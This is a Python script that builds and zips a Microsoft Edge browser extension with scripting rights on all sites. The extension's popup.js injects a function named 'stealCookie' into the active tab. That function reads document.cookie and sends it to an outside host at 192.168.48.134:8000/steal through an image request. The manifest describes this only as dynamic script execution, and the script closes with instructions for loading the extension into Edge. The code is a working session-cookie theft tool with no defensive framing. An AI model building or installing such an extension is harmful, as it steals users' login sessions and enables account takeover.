#!/usr/bin/env python3
import os
import shutil
import base64
import zipfile
import json

# --- Configuration ---
EXT_NAME = "my-extension"
ZIP_NAME = f"{EXT_NAME}.zip"

# --- Clean up any previous output ---
if os.path.isdir(EXT_NAME):
    shutil.rmtree(EXT_NAME)
if os.path.isfile(ZIP_NAME):
    os.remove(ZIP_NAME)

# --- Create directory structure ---
os.makedirs(os.path.join(EXT_NAME, "icons"), exist_ok=True)

# --- Generate manifest.json ---
manifest = {
    "manifest_version": 3,
    "name": "My Edge Extension",
    "version": "1.0",
    "description": "Execute dynamic scripts via scripting.executeScript injection",
    "icons": {"48": "icons/icon-48.png"},
    "permissions": ["scripting", "activeTab"],
    "host_permissions": ["<all_urls>"],
    "action": {
        "default_popup": "popup.html",
        "default_icon": "icons/icon-48.png"
    },
    "background": {
        "service_worker": "background.js"
    }
}
with open(os.path.join(EXT_NAME, "manifest.json"), "w", encoding="utf-8") as f:
    json.dump(manifest, f, indent=2)

# --- Create background.js ---
with open(os.path.join(EXT_NAME, "background.js"), "w", encoding="utf-8") as f:
    f.write(
        "chrome.runtime.onInstalled.addListener(() => { console.log('Extension installed.'); });"
    )

# --- Create popup.html ---
with open(os.path.join(EXT_NAME, "popup.html"), "w", encoding="utf-8") as f:
    f.write("""<!DOCTYPE html>
<html>
<head>
  <meta charset=\"utf-8\">
  <title>Popup</title>
</head>
<body>
  <textarea id=\"scriptInput\" rows=4 cols=30 placeholder=\"<script>...</script>\"></textarea>
  <button id=\"runBtn\">Run Script</button>
  <div id=\"statusDiv\" style=\"margin-top:10px;color:green;\"></div>
  <script src=\"popup.js\"></script>
</body>
</html>""")

# --- Create popup.js ---
with open(os.path.join(EXT_NAME, "popup.js"), "w", encoding="utf-8") as f:
    f.write("""// popup.js

// 1) Wire up the button
document.getElementById('runBtn').addEventListener('click', () => {
  const statusDiv = document.getElementById('statusDiv');
  statusDiv.textContent = 'Attempting injection…';

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tab = tabs[0];
    if (!/^https?:/.test(tab.url)) {
      alert('Cannot inject into this page: ' + tab.url);
      statusDiv.textContent = '';
      return;
    }

    // 2) Inject our named function into the page
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: stealCookie
    })
    .then(() => {
      statusDiv.textContent = 'Injection complete';
    })
    .catch(err => {
      console.error('Injection failed:', err);
      alert('Injection failed: ' + err.message);
      statusDiv.textContent = 'Injection failed';
    });
  });
});

// 3) This function runs in the context of the page
function stealCookie() {
  // create a broken image to trigger onerror
  const img = document.createElement('img');
  img.src = 'invalid.png';  // guaranteed 404 → onerror fires

  img.onerror = () => {
    // now exfiltrate via a fresh Image object
    const ex = new Image();
    ex.src = 'http://192.168.48.134:8000/steal?c='
             + encodeURIComponent(document.cookie);
  };

  document.body.appendChild(img);
}""")

# --- Create icon placeholder ---
ICON_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGMA"
    "AQEBAQAAAQABDQottAAAAABJRU5ErkJggg=="
)
icon_data = base64.b64decode(ICON_B64)
with open(os.path.join(EXT_NAME, "icons", "icon-48.png"), "wb") as f:
    f.write(icon_data)

# --- Package into ZIP ---
with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as z:
    for root, dirs, files in os.walk(EXT_NAME):
        for file in files:
            path = os.path.join(root, file)
            z.write(path, os.path.relpath(path, EXT_NAME))

print(f"✔ Scaffold created: ./{EXT_NAME}/")
print(f"✔ Packaged as: ./{ZIP_NAME}")
print("→ In Edge: go to edge://extensions → Developer mode → Load unpacked → select './my-extension'")
